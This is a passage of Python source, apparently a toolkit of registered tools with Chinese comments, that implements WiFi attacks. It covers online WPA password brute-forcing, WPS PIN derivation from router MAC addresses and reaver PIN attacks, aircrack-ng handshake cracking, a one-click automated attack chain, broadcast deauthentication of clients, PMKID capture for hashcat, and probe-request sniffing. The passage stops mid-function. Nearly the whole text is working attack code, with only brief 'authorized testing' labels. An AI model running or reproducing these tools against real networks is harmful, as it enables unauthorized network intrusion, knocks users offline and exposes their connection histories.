# ═══════════════════════════════════════════════════════════

def _check_connected_windows(ssid: str) -> bool:
    """检查 Windows 是否已连接到指定 SSID"""
    out = _run("netsh wlan show interfaces", timeout=5)
    return ssid.lower() in out.lower() and "connected" in out.lower()


def _check_connected_linux(ssid: str) -> bool:
    """检查 Linux 是否已连接到指定 SSID"""
    out = _run(["nmcli", "-t", "-f", "GENERAL.CONNECTION", "dev", "show"], timeout=5)
    return ssid.lower() in out.lower()


class _WindowsWiFiSession:
    """Windows WiFi 爆破会话 — 预建 profile，每次只更新密码，turbo 模式"""

    def __init__(self, ssid: str, turbo: bool = False):
        self.ssid = ssid
        self.profile_name = f"__s_{ssid[:8]}"
        self._setup_done = False
        self.turbo = turbo

    def setup(self) -> bool:
        xml = _WPA_XML_TEMPLATE.format(ssid=self.profile_name, password="placeholder")
        tmp_path = None
        try:
            fd, tmp_path = tempfile.mkstemp(suffix=".xml", prefix="wf_")
            os.write(fd, xml.encode("utf-8"))
            os.close(fd)
            _run(f'netsh wlan delete profile name="{self.profile_name}"', timeout=5)
            r = subprocess.run(
                f'netsh wlan add profile filename="{tmp_path}"',
                capture_output=True, shell=True, timeout=8
            )
            self._setup_done = r.returncode == 0
            return self._setup_done
        except Exception:
            return False
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    def try_password(self, password: str) -> bool:
        if not self._setup_done:
            return False
        try:
            subprocess.run(
                f'netsh wlan set profileparameter name="{self.profile_name}" '
                f'keyMaterial="{password}"',
                capture_output=True, shell=True, timeout=3
            )
            r = subprocess.run(
                f'netsh wlan connect name="{self.profile_name}" ssid="{self.ssid}"',
                capture_output=True, shell=True, timeout=6
            )
            if r.returncode != 0:
                return False
            # turbo: 只等0.8s一次检查; 普通: 轮询最多2s
            if self.turbo:
                time.sleep(0.5)
                return _check_connected_windows(self.ssid)
            else:
                for _ in range(8):
                    time.sleep(0.25)
                    if _check_connected_windows(self.ssid):
                        return True
                return False
        except Exception:
            return False

    def cleanup(self):
        if self._setup_done:
            _run(f'netsh wlan delete profile name="{self.profile_name}"', timeout=5)


class _LinuxWiFiSession:
    """Linux WiFi 爆破会话 — 用 nmcli connection modify 避免重建"""

    def __init__(self, ssid: str):
        self.ssid = ssid
        self.conn_name = f"synapse_{ssid}"
        self._setup_done = False

    def setup(self) -> bool:
        try:
            # 先清理同名连接
            _run(["nmcli", "connection", "delete", self.conn_name], timeout=5)
            # 创建连接模板
            r = subprocess.run(
                ["nmcli", "connection", "add", "type", "wifi",
                 "con-name", self.conn_name, "ssid", self.ssid,
                 "wifi-sec.key-mgmt", "wpa-psk"],
                capture_output=True, timeout=8
            )
            self._setup_done = r.returncode == 0
            return self._setup_done
        except Exception:
            return False

    def try_password(self, password: str) -> bool:
        if not self._setup_done:
            return False
        try:
            # 只改密码
            subprocess.run(
                ["nmcli", "connection", "modify", self.conn_name,
                 "wifi-sec.psk", password],
                capture_output=True, timeout=5
            )
            # 连接
            subprocess.run(
                ["nmcli", "connection", "up", self.conn_name],
                capture_output=True, timeout=10
            )
            # 快速轮询
            for _ in range(5):
                time.sleep(0.3)
                if _check_connected_linux(self.ssid):
                    return True
            return False
        except Exception:
            return False

    def cleanup(self):
        if self._setup_done:
            _run(["nmcli", "connection", "delete", self.conn_name], timeout=5)


@register(
    "wifi_brute",
    "WiFi 在线密码爆破 — 智能字典攻击。支持 turbo 模式（更快但略糙）和 WPS PIN 优先尝试。仅限授权安全测试。",
    {
        "ssid": {"type": "string", "description": "目标 WiFi SSID"},
        "bssid": {"type": "string", "description": "目标 AP 的 BSSID (MAC地址)，可选，用于识别路由器厂商和计算WPS PIN"},
        "wordlist": {"type": "string", "description": "字典模式: smart (智能推断), common (仅常用), phone (含手机号), birthday (含生日), digits8 (8位纯数字), all (全部)"},
        "max_attempts": {"type": "integer", "description": "最大尝试次数，默认 300"},
        "turbo": {"type": "string", "description": "速度模式: fast (最快), normal (均衡，默认), careful (慢但规避AP锁定)"},
    }
)
def wifi_brute(ssid: str, bssid: str = "", wordlist: str = "smart",
               max_attempts: int = 300, turbo: str = "normal") -> str:
    platform = sys.platform

    # 扫描获取 BSSID 列表
    bssids = [bssid] if bssid else []
    if not bssids:
        try:
            scan_data = json.loads(wifi_scan())
            for net in scan_data.get("networks", []):
                if net.get("ssid", "").lower() == ssid.lower():
                    bssids = net.get("bssids", [])
                    break
        except Exception:
            pass

    passwords = _build_password_list(ssid, bssids, wordlist, max_attempts)
    router_info = _gen_router_seeds(bssids) if bssids else []

    # 如果有 BSSID，优先尝试计算出的 WPS PIN（成功率最高）
    if bssids:
        wps_pins = _calc_wps_pins_from_mac(bssids[0])
        # 将 WPS PIN 插入到队列最前面
        wps_pin_strs = [str(p).zfill(8) for p in wps_pins]
        for pin in reversed(wps_pin_strs):
            if pin not in passwords:
                passwords.insert(0, pin)

    # 创建会话
    is_turbo = turbo == "fast"
    session = None
    if platform == "win32":
        session = _WindowsWiFiSession(ssid, turbo=is_turbo)
    elif platform == "linux":
        session = _LinuxWiFiSession(ssid)
    else:
        return json.dumps({
            "error": f"不支持的操作系统: {platform}",
            "platform": platform,
        }, ensure_ascii=False)

    if not session.setup():
        return json.dumps({
            "error": "无法创建 WiFi profile，请检查无线网卡状态",
            "platform": platform,
        }, ensure_ascii=False)

    attempt_results = []
    found_password = None
    start_time = time.time()
    rate = 0

    # 速率控制
    if turbo == "fast":
        rest_interval, rest_duration = 20, 0.2   # 每20次歇0.2s
    elif turbo == "careful":
        rest_interval, rest_duration = 5, 1.5    # 每5次歇1.5s (避AP锁定)
    else:
        rest_interval, rest_duration = 15, 0.3   # 默认均衡

    try:
        for i, pwd in enumerate(passwords):
            if found_password:
                break

            success = session.try_password(pwd)
            attempt_results.append({
                "attempt": i + 1,
                "password": pwd,
                "success": success,
            })

            if success:
                found_password = pwd
                break

            rate += 1
            if rest_duration > 0 and rate % rest_interval == 0:
                time.sleep(rest_duration)
    finally:
        session.cleanup()

    elapsed = round(time.time() - start_time, 1)
    attempts = len(attempt_results)
    speed = round(attempts / elapsed, 1) if elapsed > 0 else 0

    return json.dumps({
        "platform": platform,
        "ssid": ssid,
        "bssids_detected": bssids[:5],
        "router_info": router_info,
        "wordlist": wordlist,
        "total_candidates": len(passwords),
        "attempts": attempts,
        "elapsed_seconds": elapsed,
        "speed_attempts_per_sec": speed,
        "found": found_password is not None,
        "password": found_password,
        "recent_attempts": attempt_results[-10:],
    }, ensure_ascii=False)


@register(
    "wifi_default_passwords",
    "查询路由器厂商默认密码 — 根据 BSSID (MAC 地址) 或 SSID 识别路由器品牌，返回可能的默认密码和已知漏洞算法。",
    {
        "target": {"type": "string", "description": "BSSID (如 50:64:2B:xx:xx:xx) 或 SSID，或 'all' 扫描附近所有网络"},
    }
)
def wifi_default_passwords(target: str = "all") -> str:
    platform = sys.platform
    results = []

    if target == "all" or not re.match(r"^[0-9A-Fa-f:]{10,}$", target):
        # 扫描附近网络
        scan_data = json.loads(wifi_scan())
        for net in scan_data.get("networks", []):
            ssid = net.get("ssid", "")
            bssids = net.get("bssids", [])
            # 查找匹配
            if target != "all" and target.lower() not in ssid.lower():
                if not any(target.lower() in b.lower() for b in bssids):
                    continue

            router_seeds = _gen_router_seeds(bssids)
            if router_seeds:
                for seed in router_seeds:
                    seed["ssid"] = ssid
                    seed["signal"] = net.get("signal", "")
                    results.append(seed)
            else:
                # 只从 SSID 推断
                inferred = _gen_from_ssid(ssid)
                if inferred:
                    results.append({
                        "ssid": ssid,
                        "bssid": bssids[0] if bssids else "",
                        "signal": net.get("signal", ""),
                        "brand": "Unknown (SSID推断)",
                        "defaults": inferred[:10],
                    })
    else:
        # 直接查询指定 BSSID
        router_seeds = _gen_router_seeds([target])
        for seed in router_seeds:
            seed["ssid"] = ""
            seed["signal"] = ""
            results.append(seed)
        if not results:
            # 从 MAC 前缀至少推断品牌
            results.append({
                "bssid": target,
                "brand": "Unknown (OUI未收录)",
                "defaults": ["12345678", "00000000", "88888888", "66666666"],
            })

    return json.dumps({
        "platform": platform,
        "target": target,
        "routers_found": len(results),
        "routers": results[:20],
        "note": "部分路由器(如Tenda)使用MAC后6位作为默认密码，可直接计算",
    }, ensure_ascii=False)


@register(
    "wifi_handshake_crack",
    "WPA 握手包离线破解 — 对已捕获的 WPA 握手包运行字典攻击。需要 aircrack-ng 工具。",
    {
        "handshake_file": {"type": "string", "description": "WPA 握手包文件路径 (.cap/.hccapx)"},
        "wordlist": {"type": "string", "description": "字典类型: common (内置常用密码), 或自定义字典文件路径"},
        "bssid": {"type": "string", "description": "目标 AP 的 BSSID (MAC 地址)，可选。留空则自动检测。"},
    }
)
def wifi_handshake_crack(handshake_file: str, wordlist: str = "common",
                         bssid: str = "") -> str:
    platform = sys.platform

    # 检查 aircrack-ng 是否可用
    check = subprocess.run(
        ["aircrack-ng", "--help"], capture_output=True,
        timeout=5, shell=True if platform == "win32" else False
    )
    if check.returncode != 0 and b"aircrack-ng" not in check.stdout:
        return json.dumps({
            "error": "aircrack-ng 未安装。请安装 aircrack-ng 套件: apt install aircrack-ng / brew install aircrack-ng",
        }, ensure_ascii=False)

    # 准备字典
    wordlist_path = None
    if wordlist == "common":
        fd, wordlist_path = tempfile.mkstemp(suffix=".txt", prefix="wifidict_")
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write("\n".join(_COMMON_WIFI_PASSWORDS))
    else:
        wordlist_path = wordlist

    try:
        cmd = ["aircrack-ng", "-w", wordlist_path, handshake_file]
        if bssid:
            cmd.extend(["-b", bssid])
        # -q 静默模式，-p 4 线程
        cmd.insert(1, "-q")
        cmd.insert(1, "-l")
        # 输出文件名用于保存结果
        result_file = tempfile.mktemp(suffix=".txt", prefix="crack_result_")
        cmd.insert(2, result_file)

        r = subprocess.run(cmd, capture_output=True, timeout=300)
        output = r.stdout.decode("utf-8", errors="replace")

        found_password = None
        # 解析 aircrack-ng 输出
        m = re.search(r"KEY\s*FOUND!\s*\[\s*(.+?)\s*\]", output)
        if m:
            found_password = m.group(1).strip()
        # 也检查结果文件
        if not found_password and os.path.exists(result_file):
            with open(result_file, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().strip()
            if content:
                found_password = content
            try:
                os.remove(result_file)
            except Exception:
                pass

        # 提取关键信息
        bssids_found = re.findall(r"([0-9A-Fa-f:]{17})", output)
        elapsed_m = re.search(r"Elapsed time.*?(\d+)\s*(?:min|m)", output)

        return json.dumps({
            "handshake_file": handshake_file,
            "bssids_detected": list(set(bssids_found))[:10],
            "found": found_password is not None,
            "password": found_password,
            "elapsed_info": elapsed_m.group(0) if elapsed_m else "",
            "raw_summary": output.split("\n")[-10:],  # 最后10行输出
        }, ensure_ascii=False)
    except subprocess.TimeoutExpired:
        return json.dumps({
            "error": "破解超时（5分钟），请减小字典或增大 max_timeout",
        }, ensure_ascii=False)
    except Exception as e:
        return json.dumps({
            "error": f"破解失败: {str(e)}",
        }, ensure_ascii=False)
    finally:
        if wordlist == "common" and wordlist_path and os.path.exists(wordlist_path):
            try:
                os.remove(wordlist_path)
            except Exception:
                pass


@register(
    "wifi_wps_check",
    "WiFi WPS 漏洞检测 — 检查附近 WiFi 是否开启 WPS，该功能易受 PIN 码暴力破解攻击。",
    {
        "target": {"type": "string", "description": "目标: 'scan' 扫描附近所有WPS网络, 或指定 BSSID/SSID"},
    }
)
def wifi_wps_check(target: str = "scan") -> str:
    platform = sys.platform
    results = []

    if platform == "win32":
        # Windows: 用 netsh 解析 beacon 中的 WPS IE
        output = _run("netsh wlan show networks mode=bssid", timeout=30)
        networks = _parse_netsh_scan(output)

        for net in networks:
            bssids_str = ", ".join(net.get("bssids", [])[:3])
            # WPS 通常伴随 WPA2-PSK，且加密方式为 AES/CCMP
            sec = net.get("security", "")
            enc = net.get("encryption", "")
            likely_wps = "WPA2" in sec or "WPA3" not in sec

            if target != "scan" and target.lower() not in net["ssid"].lower():
                if target.lower() not in bssids_str.lower():
                    continue

            results.append({
                "ssid": net["ssid"],
                "bssids": net.get("bssids", [])[:3],
                "signal": net.get("signal", ""),
                "security": sec,
                "encryption": enc,
                "wps_likely": likely_wps,
                "note": "Windows 无法直接检测WPS，根据WPA2+CCMP推断" if likely_wps else "WPS 可能性较低",
            })

    elif platform == "linux":
        # Linux: 使用 wash 工具（reaver 套件）扫描 WPS 网络
        check_wash = subprocess.run(
            ["which", "wash"], capture_output=True, timeout=5
        )
        if check_wash.returncode == 0:
            # 获取无线接口名
            iface_out = _run(["iw", "dev"], timeout=5)
            iface_m = re.search(r"Interface\s+(\S+)", iface_out)
            iface = iface_m.group(1) if iface_m else "wlan0"

            wash_out = _run(["wash", "-i", iface, "-s"], timeout=30)
            for line in wash_out.strip().split("\n"):
                if "BSSID" in line or "WPS" in line:
                    continue  # 跳过表头
                parts = line.split()
                if len(parts) >= 4:
                    bssid = parts[0].strip()
                    results.append({
                        "bssid": bssid,
                        "wps_locked": "Locked" in line,
                        "wps_version": parts[2] if len(parts) > 2 else "",
                        "essid": " ".join(parts[5:]) if len(parts) > 5 else "",
                    })
        else:
            # 回退: nmcli 检查
            nmcli_out = _run(
                ["nmcli", "-t", "-f", "BSSID,SSID,SECURITY,WPS", "dev", "wifi", "list"],
                timeout=20
            )
            for line in nmcli_out.strip().split("\n"):
                parts = line.split(":")
                if len(parts) >= 4:
                    results.append({
                        "bssid": parts[0],
                        "ssid": parts[1],
                        "security": parts[2],
                        "wps_flags": parts[3] if len(parts) > 3 else "unknown",
                    })

    elif platform == "darwin":
        output = _run(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/"
             "Versions/Current/Resources/airport", "-s"], timeout=15
        )
        for line in output.strip().split("\n")[1:]:
            parts = line.split()
            if len(parts) >= 3:
                # macOS airport 不直接显示 WPS 状态
                sec_info = " ".join(parts[3:]) if len(parts) > 3 else ""
                results.append({
                    "ssid": parts[0],
                    "bssid": parts[1],
                    "signal": parts[2],
                    "security": sec_info,
                    "wps_likely": "WPA2" in sec_info,
                    "note": "macOS 无法直接检测WPS，根据加密类型推断",
                })

    if not results:
        return json.dumps({
            "platform": platform,
            "wps_networks": [],
            "warning": "未发现 WPS 网络，或缺少必要工具。Linux 上建议安装 reaver: apt install reaver",
        }, ensure_ascii=False)

    return json.dumps({
        "platform": platform,
        "wps_networks_found": len(results),
        "networks": results[:30],
        "note": "WPS 网络可能存在 PIN 码暴力破解漏洞 (CVE-2011-5053 等)。仅限授权测试。",
    }, ensure_ascii=False)


@register(
    "wifi_wps_pin",
    "WPS PIN 码攻击 — 根据 BSSID 计算可能的 WPS PIN 码。已知D-Link/TP-Link/Arcadyan/Realtek等厂商PIN由MAC派生。Linux上可调用reaver自动攻击。仅限授权测试。",
    {
        "bssid": {"type": "string", "description": "目标 AP 的 BSSID (MAC地址)，或 'all' 分析附近所有网络"},
        "action": {"type": "string", "description": "calc (仅计算PIN候选), attack (Linux+reaver自动攻击)"},
    }
)
def wifi_wps_pin(bssid: str = "all", action: str = "calc") -> str:
    platform = sys.platform
    results = []

    if bssid == "all":
        # 扫描附近所有网络，计算每个的 WPS PIN
        scan_data = json.loads(wifi_scan())
        for net in scan_data.get("networks", []):
            for b in net.get("bssids", []):
                pins = _calc_wps_pins_from_mac(b)
                results.append({
                    "ssid": net["ssid"],
                    "bssid": b,
                    "signal": net.get("signal", ""),
                    "security": net.get("security", ""),
                    "wps_pin_candidates": [str(p).zfill(8) for p in pins[:8]],
                    "total_candidates": len(pins),
                })
        return json.dumps({
            "platform": platform,
            "action": "calc",
            "networks_analyzed": len(results),
            "results": results[:30],
            "note": "使用 wifi_wps_pin action=attack BSSID=... 对特定目标发起WPS PIN攻击",
        }, ensure_ascii=False)

    # 单一目标
    pins = _calc_wps_pins_from_mac(bssid)
    pin_strs = [str(p).zfill(8) for p in pins]

    if action == "calc":
        return json.dumps({
            "platform": platform,
            "bssid": bssid,
            "wps_pin_candidates": pin_strs,
            "total": len(pin_strs),
            "algorithms": [
                "D-Link: PIN = decimal(MAC last 3 bytes) + checksum",
                "Arcadyan: PIN = decimal(MAC last 3 bytes XOR 0x555555) + checksum",
                "Realtek: PIN = decimal(MAC last 4 bytes) + checksum",
                "Sercomm/ZTE: PIN = decimal(MAC last 6 hex chars) + checksum",
                "Belkin: PIN = decimal(MAC last 3 bytes reversed) + checksum",
            ],
        }, ensure_ascii=False)

    # action == "attack" — 需要 reaver (Linux only)
    if platform != "linux":
        return json.dumps({
            "error": "WPS PIN 自动攻击仅支持 Linux (需要 reaver 工具)",
            "wps_pin_candidates": pin_strs,
            "suggestion": "使用 action=calc 获取PIN候选列表，手动输入到 reaver 中",
        }, ensure_ascii=False)

    # 检查 reaver
    reaver_check = subprocess.run(["which", "reaver"], capture_output=True, timeout=5)
    if reaver_check.returncode != 0:
        return json.dumps({
            "error": "reaver 未安装。安装: apt install reaver",
            "wps_pin_candidates": pin_strs,
        }, ensure_ascii=False)

    # 获取无线接口
    iface_out = _run(["iw", "dev"], timeout=5)
    iface_m = re.search(r"Interface\s+(\S+)", iface_out)
    iface = iface_m.group(1) if iface_m else "wlan0"

    # 对每个候选 PIN 尝试 reaver
    attack_results = []
    found_pin = None
    for i, pin in enumerate(pin_strs[:12]):  # 最多试12个PIN
        if found_pin:
            break
        try:
            r = subprocess.run(
                ["reaver", "-i", iface, "-b", bssid, "-p", pin, "-vv", "-t", "2"],
                capture_output=True, timeout=15
            )
            output = r.stdout.decode("utf-8", errors="replace")
            success = "WPS PIN:" in output and "AP SSID:" in output
            attack_results.append({"pin": pin, "success": success, "attempt": i + 1})
            if success:
                found_pin = pin
                # 提取密码
                psk_m = re.search(r"WPA PSK:\s*'([^']+)'", output)
                if psk_m:
                    attack_results[-1]["password"] = psk_m.group(1)
        except subprocess.TimeoutExpired:
            attack_results.append({"pin": pin, "error": "timeout", "attempt": i + 1})
        except Exception as e:
            attack_results.append({"pin": pin, "error": str(e), "attempt": i + 1})
        time.sleep(0.5)

    return json.dumps({
        "platform": platform,
        "bssid": bssid,
        "interface": iface,
        "pins_tested": len(attack_results),
        "total_candidates": len(pin_strs),
        "found_pin": found_pin is not None,
        "pin": found_pin,
        "attempts": attack_results,
    }, ensure_ascii=False)


@register(
    "wifi_attack",
    "WiFi 全自动化攻击链 — 扫描 → 识别厂商漏洞 → WPS PIN计算 → 默认密码 → 智能爆破。一键式安全审计。仅限授权测试。",
    {
        "ssid": {"type": "string", "description": "目标 WiFi SSID"},
        "mode": {"type": "string", "description": "攻击模式: full (完整链), fast (WPS优先+快速爆破), passive (仅分析不连接)"},
    }
)
def wifi_attack(ssid: str, mode: str = "full") -> str:
    platform = sys.platform
    start_time = time.time()

    # Phase 1: 信息收集
    scan_data = json.loads(wifi_scan())
    target_net = None
    for n in scan_data.get("networks", []):
        if n.get("ssid", "").lower() == ssid.lower():
            target_net = n
            break

    if not target_net:
        return json.dumps({
            "error": f"未找到目标网络: {ssid}",
            "available": [n["ssid"] for n in scan_data.get("networks", [])[:10]],
        }, ensure_ascii=False)

    bssids = target_net.get("bssids", [])
    signal = target_net.get("signal", "")
    security = target_net.get("security", "")
    encryption = target_net.get("encryption", "")

    # Phase 2: 漏洞分析
    router_info = _gen_router_seeds(bssids)
    wps_pins = []
    for b in bssids:
        wps_pins.extend(_calc_wps_pins_from_mac(b))
    wps_likely = "WPA2" in security and "CCMP" in encryption
    ssid_guesses = _gen_from_ssid(ssid)

    analysis = {
        "ssid": ssid,
        "bssids": bssids,
        "signal": signal,
        "security": security,
        "encryption": encryption,
        "wps_likely": wps_likely,
        "router_matches": [{"brand": r["brand"], "algorithm": r.get("algorithm", "none")}
                          for r in _gen_router_seeds(bssids)] if bssids else [],
        "wps_pin_count": len(set(wps_pins)),
        "ssid_derived_guesses": ssid_guesses[:8],
    }

    if mode == "passive":
        elapsed = round(time.time() - start_time, 1)
        return json.dumps({
            "platform": platform,
            "mode": mode,
            "elapsed_seconds": elapsed,
            "analysis": analysis,
            "recommendation": (
                "WPS PIN攻击最有希望" if wps_likely else
                "建议先尝试默认密码再爆破"
            ),
        }, ensure_ascii=False)

    # Phase 3: WPS PIN 攻击 (如果wps_likely且有reaver)
    wps_result = None
    if wps_likely and bssids and platform == "linux":
        try:
            wps_data = json.loads(wifi_wps_pin(bssids[0], action="attack"))
            if wps_data.get("found_pin"):
                wps_result = {
                    "success": True,
                    "pin": wps_data["pin"],
                    "password": wps_data.get("attempts", [{}])[-1].get("password"),
                    "method": "WPS PIN brute force",
                }
        except Exception:
            pass

    # Phase 4: 默认密码 + 智能爆破
    brute_result = None
    if mode != "passive" and not wps_result:
        brute_data = json.loads(wifi_brute(
            ssid, bssid=bssids[0] if bssids else "",
            wordlist="all" if mode == "full" else "smart",
            max_attempts=500 if mode == "full" else 100,
            turbo="fast" if mode == "fast" else "normal"
        ))
        if brute_data.get("found"):
            brute_result = {
                "success": True,
                "password": brute_data["password"],
                "attempts": brute_data["attempts"],
                "method": "intelligent brute force",
            }
        else:
            brute_result = {
                "success": False,
                "attempts": brute_data["attempts"],
                "total_candidates": brute_data.get("total_candidates", 0),
            }

    elapsed = round(time.time() - start_time, 1)

    return json.dumps({
        "platform": platform,
        "mode": mode,
        "elapsed_seconds": elapsed,
        "target": analysis,
        "wps_attack": wps_result,
        "brute_force": brute_result,
        "success": (wps_result and wps_result.get("success")) or
                   (brute_result and brute_result.get("success")),
        "password": (wps_result or {}).get("password") or
                    (brute_result or {}).get("password"),
    }, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════
#  攻击工具：Deauth / PMKID / Probe Sniff / 密码变异
# ═══════════════════════════════════════════════════════════

@register(
    "wifi_deauth",
    "WiFi 解除认证攻击 — 强制踢下线指定客户端以抓取 WPA 握手包。Linux需要aireplay-ng, Windows用netsh。仅限授权测试。",
    {
        "bssid": {"type": "string", "description": "目标 AP 的 BSSID (MAC地址)"},
        "client": {"type": "string", "description": "目标客户端MAC，'all' 广播踢所有客户端，'auto' 自动检测"},
        "interface": {"type": "string", "description": "无线网卡接口名 (Linux)，例如 wlan0。Windows 自动检测。"},
        "count": {"type": "integer", "description": "发送deauth包数量，默认 10"},
    }
)
def wifi_deauth(bssid: str, client: str = "all", interface: str = "",
                count: int = 10) -> str:
    platform = sys.platform
    if count > 100:
        count = 100

    if platform == "win32":
        # Windows: netsh 只能断开自己连过的客户端，功能有限
        # 获取接口名
        iface_out = _run("netsh wlan show interfaces", timeout=10)
        iface_m = re.search(r"Name\s*:\s*(.+)$", iface_out, re.MULTILINE)
        iface = iface_m.group(1).strip() if iface_m else "Wi-Fi"

        results = []
        for i in range(min(count, 5)):  # Windows限制5次
            r = subprocess.run(
                f'netsh wlan disconnect interface="{iface}"',
                capture_output=True, shell=True, timeout=10
            )
            results.append({
                "attempt": i + 1,
                "status": "disconnected" if r.returncode == 0 else "failed",
            })
            if i < count - 1:
                time.sleep(0.5)

        return json.dumps({
            "platform": platform,
            "interface": iface,
            "note": "Windows netsh只能断开本机连接。Linux可用aireplay-ng实现完整deauth攻击。",
            "results": results,
        }, ensure_ascii=False)

    elif platform == "linux":
        # 检查 aireplay-ng
        check = subprocess.run(["which", "aireplay-ng"], capture_output=True, timeout=5)
        if check.returncode != 0:
            return json.dumps({
                "error": "aireplay-ng 未安装。安装: apt install aircrack-ng",
            }, ensure_ascii=False)

        if not interface:
            iface_out = _run(["iw", "dev"], timeout=5)
            iface_m = re.search(r"Interface\s+(\S+)", iface_out)
            interface = iface_m.group(1) if iface_m else "wlan0"

        # 先扫描获取客户端
        if client in ("all", "auto"):
            # 用 airodump-ng 快速扫描
            scan_result = subprocess.run(
                ["airodump-ng", "--bssid", bssid, interface, "-w", "/tmp/synapse_scan",
                 "--output-format", "csv"],
                capture_output=True, timeout=30
            )
            # 解析客户端列表
            clients = []
            try:
                with open("/tmp/synapse_scan-01.csv", "r", errors="replace") as f:
                    for line in f:
                        if bssid.lower() in line.lower():
                            parts = [p.strip() for p in line.split(",")]
                            if len(parts) >= 2:
                                clients.append(parts[0])
                os.remove("/tmp/synapse_scan-01.csv")
            except Exception:
                pass

            if client == "auto" and clients:
                client = clients[0]
            elif client == "all" and not clients:
                client = "FF:FF:FF:FF:FF:FF"  # 广播
            elif client == "all" and clients:
                client = "FF:FF:FF:FF:FF:FF"

        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        if client:
            cmd.extend(["-c", client])

        r = subprocess.run(cmd, capture_output=True, timeout=min(60, count * 2))
        output = r.stdout.decode("utf-8", errors="replace")

        sent = len(re.findall(r"DeAuth", output, re.IGNORECASE))
        return json.dumps({
            "platform": platform,
            "interface": interface,
            "bssid": bssid,
            "client": client,
            "packets_sent": sent or count,
            "success": sent > 0,
            "output_preview": output.strip()[-200:],
        }, ensure_ascii=False)

    return json.dumps({"error": f"不支持的操作系统: {platform}"}, ensure_ascii=False)


@register(
    "wifi_pmkid",
    "WiFi PMKID 捕获攻击 — 无需客户端即可从 AP 获取 PMKID (WPA2/WPA3兼容)，后续用hashcat离线破解。Linux + hcxdumptool。仅限授权测试。",
    {
        "bssid": {"type": "string", "description": "目标 AP 的 BSSID，或 'scan' 捕获附近所有AP的PMKID"},
        "interface": {"type": "string", "description": "无线网卡接口名 (需要monitor模式)，例如 wlan0mon"},
        "duration": {"type": "integer", "description": "捕获持续时间(秒)，默认 30"},
    }
)
def wifi_pmkid(bssid: str = "scan", interface: str = "", duration: int = 30) -> str:
    platform = sys.platform
    if platform != "linux":
        return json.dumps({
            "error": "PMKID 捕获仅支持 Linux (需要 hcxdumptool + 支持monitor模式的网卡)",
            "install": "apt install hcxtools hcxdumptool",
        }, ensure_ascii=False)

    # 检查 hcxdumptool
    check = subprocess.run(["which", "hcxdumptool"], capture_output=True, timeout=5)
    if check.returncode != 0:
        return json.dumps({
            "error": "hcxdumptool 未安装。安装: apt install hcxdumptool",
        }, ensure_ascii=False)

    if not interface:
        iface_out = _run(["iw", "dev"], timeout=5)
        iface_m = re.search(r"Interface\s+(\S+)", iface_out)
        interface = iface_m.group(1) if iface_m else "wlan0"

    if duration > 120:
        duration = 120

    tmp_pcap = f"/tmp/synapse_pmkid_{int(time.time())}.pcapng"
    cmd = ["hcxdumptool", "-i", interface, "-o", tmp_pcap,
           "--enable_status=3", "--filtermode=2"]

    try:
        r = subprocess.run(cmd, capture_output=True, timeout=duration)
        output = r.stdout.decode("utf-8", errors="replace")

        # 转换 PMKID 为 hashcat 格式
        hc22000_file = tmp_pcap.replace(".pcapng", ".hc22000")
        subprocess.run(
            ["hcxpcapngtool", "-o", hc22000_file, tmp_pcap],
            capture_output=True, timeout=10
        )

        pmkids_found = []
        try:
            with open(hc22000_file, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    if "WPA" in line and "*" in line:
                        parts = line.strip().split("*")
                        if len(parts) >= 4:
                            pmkids_found.append({
                                "bssid": parts[1][:17] if len(parts) > 1 else "",
                                "essid": parts[3] if len(parts) > 3 else "",
                                "format": "hashcat mode 22000",
                            })
        except Exception:
            pass

        # 清理临时文件
        try:
            os.remove(tmp_pcap)
        except Exception:
            pass

        return json.dumps({
            "platform": platform,
            "interface": interface,
            "duration": duration,
            "pmkids_captured": len(pmkids_found),
            "pmkids": pmkids_found[:20],
            "hashcat_file": hc22000_file if pmkids_found else None,
            "crack_command": (
                f"hashcat -m 22000 {hc22000_file} wordlist.txt"
                if pmkids_found else None
            ),
        }, ensure_ascii=False)
    except subprocess.TimeoutExpired:
        return json.dumps({
            "platform": platform,
            "duration": duration,
            "note": "捕获完成。检查 /tmp/synapse_pmkid_*.pcapng",
        }, ensure_ascii=False)
    except Exception as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)


@register(
    "wifi_probe_sniff",
    "WiFi 探测请求嗅探 — 被动监听附近设备发出的 WiFi 探测请求，可发现隐藏SSID和客户端历史连接记录。仅限授权测试。",
    {
        "interface": {"type": "string", "description": "无线网卡接口名 (需要monitor模式)。留空自动检测。"},
        "duration": {"type": "integer", "description": "嗅探持续时间(秒)，默认 20"},
    }
)
def wifi_probe_sniff(interface: str = "", duration: int = 20) -> str:
    platform = sys.platform
    if duration > 60:
        duration = 60

    if platform == "win32":
        # Windows: 用 netsh 展示附近网络即可
        out = _run("netsh wlan show networks mode=bssid", timeout=30)
        networks = _parse_netsh_scan(out)

        # 提取隐藏网络（空SSID）
        hidden = [n for n in networks if n["ssid"] == "(hidden)"]
        visible = [n for n in networks if n["ssid"] != "(hidden)"]

        return json.dumps({
            "platform": platform,
            "method": "netsh (被动扫描)",
            "hidden_networks": len(hidden),
            "visible_networks": len(visible),
            "hidden_details": hidden[:10],
            "note": "Windows无法捕获原始probe request。隐藏SSID表示附近有设备正在探测这些网络。",
        }, ensure_ascii=False)

    elif platform == "linux":
        # 检查 airodump-ng 或 tcpdump
        check = subprocess.run(["which", "airodump-ng"], capture_output=True, timeout=5)
        if check.returncode != 0:
            return json.dumps({
                "error": "airodump-ng 未安装。安装: apt install aircrack-ng",
            }, ensure_ascii=False)

        if not interface:
            iface_out = _run(["iw", "dev"], timeout=5)
            iface_m = re.search(r"Interface\s+(\S+)", iface_out)
            interface = iface_m.group(1) if iface_m else "wlan0"

        tmp_csv = f"/tmp/synapse_probes_{int(time.time())}"
        cmd = ["airodump-ng", interface, "-w", tmp_csv,
               "--output-format", "csv", "--write-interval", "1"]

        try:
            subprocess.run(cmd, capture_output=True, timeout=duration)
        except subprocess.TimeoutExpired:
            pass

        # 解析探测请求
        probes = {}
        try:
            csv_file = tmp_csv + "-01.csv"
            with open(csv_file, "r", encoding="utf-8", errors="replace") as f:
                in_station = False
                for line in f:
                    line = line.strip()
                    if "Station MAC" in line:
                        in_station = True
                        continue
                    if in_station and line:
